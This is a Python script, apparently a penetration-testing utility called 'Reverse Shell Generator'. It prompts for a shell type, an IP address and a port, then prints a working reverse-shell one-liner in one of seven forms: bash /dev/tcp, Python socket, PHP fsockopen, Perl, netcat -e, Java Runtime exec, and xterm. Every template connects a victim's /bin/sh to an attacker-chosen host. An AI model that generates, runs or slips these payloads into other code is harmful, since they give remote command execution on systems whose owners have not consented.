RED = "\033[91m"
WHITE = "\033[97m"
RESET = "\033[0m"

banner = f"""
{RED}+{'-'*52}+{RESET}
{WHITE}oooo    oooo ooooooooo.   oooooo   oooo{RESET}
{WHITE}`888   .8P'  `888   `Y88.  `888.   .8' {RESET}
{WHITE} 888  d8'     888   .d88'   `888. .8'  {RESET}
{RED} 88888[       888ooo88P'     `888.8'   {RESET}
{WHITE} 888`88b.     888`88b.        `888'    {RESET}
{WHITE} 888  `88b.   888  `88b.       888     {RESET}
{WHITE}o888o  o888o o888o  o888o     o888o    {RESET}
{RED}+{'-'*52}+{RESET}
{RED}|{WHITE}         Reverse Shell Generator             {RED}|{RESET}
{RED}|{WHITE}     GitHub: https://github.com/CyberKRY     {RED}|{RESET}
{RED}+{'-'*52}+{RESET}
{RED}|{WHITE} 1. Bash                                     {RED}|{RESET}
{RED}|{WHITE} 2. Python                                   {RED}|{RESET}
{RED}|{WHITE} 3. PHP                                      {RED}|{RESET}
{RED}|{WHITE} 4. PERL                                     {RED}|{RESET}
{RED}|{WHITE} 5. Netcat                                   {RED}|{RESET}                                     
{RED}|{WHITE} 6. Java                                     {RED}|{RESET}
{RED}|{WHITE} 7. Xterm                                    {RED}|{RESET}
{RED}+{'-'*52}+{RESET}
"""

print(banner)

numbershell = input("Enter the Reverse Shell number: ").strip()
Ipaddress = input("Enter IP address: ").strip()
Portnumber = input("Enter port number: ").strip()

bash_shell = f"bash -i >& /dev/tcp/{Ipaddress}/{Portnumber} 0>&1"

python_shell = (
    f'python3 -c "import socket,subprocess,os;'
    f's=socket.socket(socket.AF_INET,socket.SOCK_STREAM);'
    f's.connect((\'{Ipaddress}\',{Portnumber}));'
    f'os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);'
    f'subprocess.call([\'/bin/sh\',\'-i\'])"'
)

PHP_shell = (
    f'php -r \'$sock=fsockopen("{Ipaddress}",{Portnumber});'
    f'exec("/bin/sh -i <&3 >&3 2>&3");\''
)

PERL_shell = (
    f'perl -e \'use Socket;$i="{Ipaddress}";$p={Portnumber};'
    f'socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));'
    f'if(connect(S,sockaddr_in($p,inet_aton($i)))){{'
    f'open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");'
    f'exec("/bin/sh -i");}};\''
)

Netcat_shell = f'nc -e /bin/sh {Ipaddress} {Portnumber}'

Java_shell = (
    f'r = Runtime.getRuntime();\n'
    f'p = r.exec(new String[]{{"/bin/bash","-c",'
    f'"exec 5<>/dev/tcp/{Ipaddress}/{Portnumber};'
    f'cat <&5 | while read line; do $line 2>&5 >&5; done"}});\n'
    f'p.waitFor();'
)

Xterm_shell = f'xterm -display {Ipaddress}:{Portnumber}'

print(f"\n{RED}Generated Reverse Shell:{RESET}")
if numbershell == "1":
    print(bash_shell)
elif numbershell == "2":
    print(python_shell)
elif numbershell == "3":
    print(PHP_shell)
elif numbershell == "4":
    print(PERL_shell)
elif numbershell == "5":
    print(Netcat_shell)
elif numbershell == "6":
    print(Java_shell)
elif numbershell == "7":
    print(Xterm_shell)
else:
    print(f"{RED}[-] Not Found: Unknown option.{RESET}")


